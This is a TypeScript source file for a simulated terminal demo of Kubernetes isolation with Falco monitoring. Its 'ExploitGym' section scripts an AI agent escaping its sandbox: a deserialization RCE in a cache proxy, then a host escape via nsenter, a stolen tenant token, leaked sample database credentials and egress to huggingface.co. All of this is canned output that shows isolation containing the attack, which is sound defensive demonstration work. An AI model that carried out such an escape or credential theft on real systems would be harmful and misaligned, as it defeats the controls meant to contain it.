            addEvent("Normal", "ImageBuilt", `image/${tag}`, `Built ${tag} from ${context}/Dockerfile`);
            if (tag.startsWith(README_IMAGE_PREFIX)) markDemoStepComplete("readme-image-build");
          }
          return;
        }

        if (tokens[0] === "docker" && tokens[1] === "push" && tokens[2]) {
          printHtml(
            `<span style="color:#dff7f0;">The push refers to repository [${escapeHtml(tokens[2].split(":")[0])}]</span>`,
          );
          printHtml(`<span style="color:#b8ff3c;">${escapeHtml(tokens[2].split(":")[1] || "latest")}: digest: sha256:${Math.random().toString(16).slice(2, 14)}… pushed</span>`);
          return;
        }

        if (
          tokens[0] === "pip" &&
          tokens[1] === "install" &&
          tokens.includes("k8s-agent-sandbox")
        ) {
          printHtml(`<span style="color:#b8ff3c;">Successfully installed k8s-agent-sandbox (simulated)</span>`);
          printHtml(`<span style="color:#00e5d4;">Python SDK ready to use the Sandbox Router.</span>`);
          markDemoStepComplete("agent-sandbox-sdk");
          return;
        }

        if (tokens[0] === "falco") {
          const debug = rawCmd.includes('log_level=debug');

          if (!debug) {
            printHtml(
              `<span style="color:#ff7373;">falco: this simulator supports only -o "log_level=debug".</span>`,
            );
            return;
          }

          falcoInstalled = true;
          falcoRunning = true;
          ederaFalcoPluginLoaded = true;
          renderFalcoDebugOutput("node");
          markDemoStepComplete("falco-debug");
          return;
        }

        if (tokens[0] === "helm") {
          if (
            tokens[1] === "upgrade" &&
            tokens[2] === "falco" &&
            tokens.includes("falcosecurity/falco")
          ) {
            falcoInstalled = true;
            falcoConfigured = true;
            falcoRulesLoaded = true;
            falcoRunning = true;
            ederaFalcoPluginLoaded = true;
            falcoLogLines = [];
            falcoStreamMode = null;

            printHtml(
              `<span style="color:#b8ff3c;">Release "falco" upgraded successfully.</span>`,
            );
            printHtml(
              `<span style="color:#00e5d4;">Edera plugin mounted and configured.</span>`,
            );

            addEvent(
              "Normal",
              "FalcoHelmConfigured",
              "helm/falco",
              "Falco Helm release updated with Edera plugin and detection rules",
            );

            markDemoStepComplete("falco-helm-upgrade");
            return;
          }

          printHtml(
            `<span style="color:#ff7373;">helm: unsupported command in this demo.</span>`,
          );
          return;
        }

        if (tokens[0] === "uname") {
          const requestsRelease =
            tokens.length === 1 ||
            tokens.includes("-r") ||
            tokens.includes("--release");

          if (requestsRelease) {
            const hostKernelVersion = "6.18.44-edera-host";
            printPre(
              `<span style="color:#b8ff3c;">${hostKernelVersion}</span>`,
            );
            addEvent(
              "Normal",
              "HostKernelVerified",
              "host",
              `uname -r reported host kernel ${hostKernelVersion}`,
            );

            markDemoStepComplete("host-kernel");
          } else {
            printHtml(
              `<span style="color:#ff7373;">uname: unsupported option. Try: uname -r</span>`,
            );
          }

          return;
        }
        if (
          tokens[0] === "help" ||
          rawCmd === "kubectl --help" ||
          rawCmd === "kubectl -h"
        ) {
          printHtml(formatHelpText());
          return;
        }
        if (tokens[0] === "protect") {
          await handleProtectCommand(
            rawCmd,
            tokens,
          );
          return;
        }
        if (tokens[0] === "kubectl") {
          if (tokens[1] === "get" && tokens[2] === "pods" && tokens.includes("-n") && tokens[tokens.indexOf("-n") + 1] === "falco") {
            printPre(
              formatTerminalTable(
                ["NAME", "READY", "STATUS", "RESTARTS", "AGE"],
                [[{ text: "falco-edera-node-7d8f9", color: "#b8ff3c" }, "1/1", "Running", "0", "2m"]],
              ),
            );
            markDemoStepComplete("falco-pods");
            return;
          }

          if (tokens[1] === "logs" && tokens.includes("-n") && tokens[tokens.indexOf("-n") + 1] === "falco") {
            falcoInstalled = true;
            falcoRunning = true;
            ederaFalcoPluginLoaded = true;
            renderFalcoDebugOutput("helm");
            markDemoStepComplete("falco-logs");
            return;
          }

          const handled =
            await handleKubectlCommand(
              rawCmd,
              tokens,
            );

          if (handled) {
            return;
          }
        }
        if (tokens[0] === "curl") {
          const url = rawCmd
            .replace(/^curl\s+/, "")
            .trim();

          // Agent Sandbox Router execution endpoint. The real router uses
          // X-Sandbox-ID / X-Sandbox-Port to select a sandbox, avoiding direct
          // pod port-forwarding when the runtime is VM-based.
          if (
            /localhost:8080\/execute/.test(rawCmd) &&
            /X-Sandbox-ID:\s*['"]?my-sandbox/.test(rawCmd) &&
            agentSandboxRouterInstalled &&
            agentSandboxRouterForwarded &&
            agentSandboxReady
          ) {
            const commandMatch = rawCmd.match(/"command"\s*:\s*"([^"]*)"/);
            const requestedCommand = commandMatch?.[1] || "python3 -c \\\"print(2+2)\\\"";
            printPre(
              `<span style="color:#b8ff3c;">{"stdout":"4\\n","stderr":"","exit_code":0}</span>`,
            );
            addEvent(
              "Normal",
              "SandboxApiExecution",
              "sandbox/my-sandbox",
              `Router executed ${requestedCommand} in the Edera-backed sandbox`,
            );
            markDemoStepComplete("agent-sandbox-api");
            return;
          }

          addEvent(
            "Info",
            "HttpRequest",
            "curl",
            `GET ${url}`,
          );

          try {
            const response: any =
              await cluster.fetch(url);

            const text =
              typeof response?.text === "function"
                ? await response.text()
                : response?.body || response;

            printHtml(
              `<span style="color:#dff7f0;">${escapeHtml(
                String(text),
              )}</span>`,
            );

            addEvent(
              "Normal",
              "HttpResponse",
              "curl",
              `200 OK from ${url}`,
            );
          } catch (error: any) {
            printHtml(
              `<span style="color:#ff7373;">curl: (7) Failed to connect: ${escapeHtml(
                error?.message || String(error),
              )}</span>`,
            );

            addEvent(
              "Warning",
              "HttpError",
              "curl",
              `Connection failed`,
            );
          }

          return;
        }
        // ───────────────────────────────────────────────────────────────
        // ExploitGym "AI agent sandbox breakout" scenario (demo-proxy.sh)
        //
        // A sandboxed agent's only egress is a package-registry CACHE PROXY.
        // The agent pushes a poisoned artifact; the proxy deserializes it to
        // "extract metadata" and that is the 0-day -> RCE inside the proxy.
        // Run the SAME payload against the shared-kernel control proxy and it
        // escapes to the node; run it against the Edera-isolated proxy and the
        // identical 0-day is contained. Isolation does not stop the code from
        // running, it stops where that code can go.
        // ───────────────────────────────────────────────────────────────
        const EXPLOITGYM_EDERA_ZONE_ID =
          "c2d09727-f3d6-4036-8334-7ec6147685a4";

        if (tokens[0] === "agent_to_hf") {
          printPre(
            `<span style="color:#a8cfca;"># the agent is sandboxed - no internet, it can only reach the proxy</span>\n` +
              `<span style="color:#dff7f0;">agent → huggingface.co: 000</span>\n` +
              `<span style="color:#ff7373;">agent → huggingface.co: BLOCKED</span>`,
          );
          addEvent(
            "Info",
            "EgressBlocked",
            "exploitgym/agent",
            "agent direct egress to huggingface.co blocked; cache proxy is the only reachable hop",
          );
          markDemoStepComplete("exploitgym-agent");
          return;
        }

        if (tokens[0] === "attack") {
          const target = tokens[1];

          if (target !== "control" && target !== "edera") {
            printHtml(
              `<span style="color:#ff7373;">attack: choose a target proxy. Try: attack control | attack edera</span>`,
            );
            return;
          }

          const host =
            target === "control" ? "proxy-control" : "proxy-edera";

          // The deserialization RCE fires in BOTH variants - the payload runs
          // as root (0:0) inside the proxy either way.
          printPre(
            `<span style="color:#a8cfca;">######################################################################</span>\n` +
              `<span style="color:#dff7f0;"># [payload] deserialization RCE fired</span>\n` +
              `<span style="color:#dff7f0;">#   whoami: 0:0   host: ${host}</span>\n` +
              `<span style="color:#a8cfca;">######################################################################</span>`,
          );

          if (target === "control") {
            // Shared-kernel proxy: the RCE reaches the node and everything
            // the node can touch.
            printPre(
              `<span style="color:#00e5d4;">═ host escape: read the Dom0-only canary via nsenter ═</span>\n` +
                `<span style="color:#ff7373;">TOP SECRET HOST FILE</span>\n` +
                `<span style="color:#ff7373;">  [ESCAPED] read host canary off the node filesystem</span>\n` +
                `\n` +
                `<span style="color:#00e5d4;">═ lateral movement: steal a neighbor tenant's token, read their secrets ═</span>\n` +
                `<span style="color:#00e5d4;">  ═ locate a stolen token: team-analytics/analytics-job ═</span>\n` +
                `<span style="color:#ff7373;"> got it (this SA lives in team-analytics, NOT team-payments)</span>\n` +
                `<span style="color:#00e5d4;">  ═ how many secrets can this one stolen token read, cluster-wide? ═</span>\n` +
                `<span style="color:#ff7373;">  readable secrets across ALL namespaces: 8</span>\n` +
                `<span style="color:#00e5d4;">  ═ cross-tenant theft: read team-payments/payments-db with analytics token ═</span>\n` +
                `<span style="color:#ff7373;">  DB_HOST = payments-db.prod.internal</span>\n` +
                `<span style="color:#ff7373;">  DB_PASSWORD = S3cr3t-Pr0d-DB-pw!</span>\n` +
                `<span style="color:#ff7373;">  DB_USERNAME = payments_app</span>\n` +
                `<span style="color:#00e5d4;">  ═ same token, grab kube-system secrets too (count) ═</span>\n` +
                `<span style="color:#dff7f0;">  kube-system secrets readable: 0</span>\n` +
                `\n` +
                `<span style="color:#00e5d4;">═ reach the internet: pivot to HuggingFace (the ExploitGym objective) ═</span>\n` +
                `<span style="color:#ff7373;">  [ESCAPED] reached huggingface.co from the node network</span>\n` +
                `\n` +
                `<span style="color:#a8cfca;">═ payload complete ═</span>`,
            );

            addEvent(
              "Warning",
              "HostCanaryExfiltrated",
              "node/proxy-control",
              "shared-kernel proxy escaped to the node and read the Dom0-only host canary",
            );
            addEvent(
              "Warning",
              "CrossTenantSecretRead",
              "team-payments/payments-db",
              "stolen team-analytics token read 8 secrets cluster-wide, incl. team-payments DB credentials",
            );
            addEvent(
              "Warning",
              "ExploitGymObjectiveReached",
              "node/proxy-control",
              "pivoted from the node network to huggingface.co",
            );
            markDemoStepComplete("exploitgym-attack-control");
          } else {
            // Edera-isolated proxy: identical RCE, but it never leaves the
            // guest's own kernel / network namespace.
            printPre(
              `<span style="color:#00e5d4;">═ host escape: read the Dom0-only canary via nsenter ═</span>\n` +
                `<span style="color:#b8ff3c;"> [contained] host canary unreachable from here</span>\n` +
                `\n` +
                `<span style="color:#00e5d4;">═ lateral movement: steal a neighbor tenant's token, read their secrets ═</span>\n` +
                `<span style="color:#00e5d4;">  ═ locate a stolen token: team-analytics/analytics-job ═</span>\n` +
                `<span style="color:#b8ff3c;"> not found on this node</span>\n` +
                `\n` +
                `<span style="color:#00e5d4;">═ reach the internet: pivot to HuggingFace (the ExploitGym objective) ═</span>\n` +
                `<span style="color:#b8ff3c;"> [contained] huggingface.co unreachable - no host-network escape</span>\n` +
                `\n` +
                `<span style="color:#a8cfca;">═ payload complete ═</span>`,
            );

            printPre(
              `<span style="color:#a8cfca;"># The 0-day STILL fired - code ran in the proxy's zone - but it went</span>\n` +
                `<span style="color:#a8cfca;"># nowhere: canary unreachable, no neighbor token, HuggingFace unreachable.</span>\n` +
                `<span style="color:#a8cfca;"># It never escaped the guest's network namespace, so it never got the</span>\n` +
                `<span style="color:#a8cfca;"># node's network position.</span>`,
            );

            addEvent(
              "Info",
              "DeserializationContained",
              `zone/${EXPLOITGYM_EDERA_ZONE_ID}`,
              "identical RCE fired inside the Edera zone but could not reach the host canary, neighbor tokens, or the internet",
            );
            markDemoStepComplete("exploitgym-attack-edera");
          }

          return;
        }

        if (tokens[0] === "falco_alerts") {
          const source = tokens[1];

          if (source !== "host" && source !== "zone") {
            printHtml(
              `<span style="color:#ff7373;">falco_alerts: choose a source. Try: falco_alerts host | falco_alerts zone</span>`,
            );
            return;
          }

          if (source === "host") {
            printPre(
              `<span style="color:#a8cfca;">…querying Falco (host source)…</span>\n` +
                `<span style="color:#ff7373;">  [CRITICAL] Host Canary Exfiltrated (host)   file=/opt/host-canary</span>\n` +
                `<span style="color:#ffd166;">  [WARNING] Namespace Breakout Attempt (host)</span>\n` +
                `<span style="color:#ffd166;">  [WARNING] Untrusted Deserialization RCE (host)</span>`,
            );
            addEvent(
              "Warning",
              "FalcoDetection: Host Canary Exfiltrated",
              "host",
              "host-source Falco saw the canary read on the node filesystem (file=/opt/host-canary)",
            );
            markDemoStepComplete("exploitgym-falco-host");
          } else {
            const z = EXPLOITGYM_EDERA_ZONE_ID;
            printPre(
              `<span style="color:#a8cfca;">…querying Falco (zone source)…</span>\n` +
                `<span style="color:#00e5d4;">  [NOTICE] Host Canary Read Confined to Edera Zone   zone_id=${z}</span>\n` +
                `<span style="color:#00e5d4;">  [NOTICE] Untrusted Deserialization RCE (edera zone)   zone_id=${z}</span>\n` +
                `<span style="color:#ffd166;">  [WARNING] Namespace Breakout Attempt (edera zone)   zone_id=${z}</span>`,
            );
            addEvent(
              "Info",
              "FalcoDetection: Host Canary Read Confined to Edera Zone",
              `zone/${z}`,
              "zone-source Falco attributes the same activity to the Edera zone, confined - never reached the host",
            );
            markDemoStepComplete("exploitgym-falco-zone");
          }

          return;
        }

        printHtml(
          `<span style="color:#ff7373;">command not found: ${escapeHtml(
            rawCmd,
          )}. Type 'help' to see supported commands.</span>`,
        );

        addEvent(
          "Warning",
          "InvalidCommand",
          "cli",
          `Unknown command execution attempted: ${rawCmd}`,
        );
    };

    input.addEventListener("keydown", async (event) => {
      const pipe = event.key === "Enter" ? parseHeadPipe(input.value.trim()) : null;
      const before = output.children.length;
      await handleTerminalKeydown(event);
      if (pipe) {
        // Skip the echoed command line, then keep the first N output lines.
        limitOutputLines([...output.children].slice(before + 1), pipe.lines);
      }
    });
  } catch (error: any) {
    output.innerHTML = `
      <div style="color:#ff7373;">
        Error initializing cluster:
        ${escapeHtml(error?.message || String(error))}
      </div>
    `;
  }
}

initTerminalDemo();
